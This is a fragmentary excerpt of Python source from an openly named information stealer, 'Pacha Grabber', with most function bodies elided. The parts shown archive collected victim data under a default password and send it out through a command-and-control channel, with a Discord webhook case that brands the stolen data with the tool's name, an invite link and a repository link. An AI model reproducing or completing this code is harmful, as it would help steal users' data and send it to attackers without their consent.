...
Logger = logging.getLogger("Pacha Grabber")
    ...
    def CreateArchive(self) -> tuple[str, str]: # Create archive of the data collected
        ...
        if Utility.GetSelf()[1] or os.path.isfile(rarPath):
            ...
            if os.path.isfile(rarPath):
                password = Settings.ArchivePassword or "Pacha123"
    ...
    def SendData(self) -> None: # Sends data to the webhook
        ...
        match Settings.C2[0]:
            case 0: # Discord Webhook
                image_url = "https://telegra.ph/file/ce48de4856694e9883717.jpg"
                    ...
                    "embeds": [
                        {
                            ...
                            "url": "https://discord.gg/VY2Pt7GH5Y",
                            "color": 34303,
                            "footer": {
                                "text": "Grabbed by Pacha Grabber | https://github.com/Pachatkas/Pacha-Grabber.git"
                            },
                            "thumbnail": {
                                "url": image_url
                            }
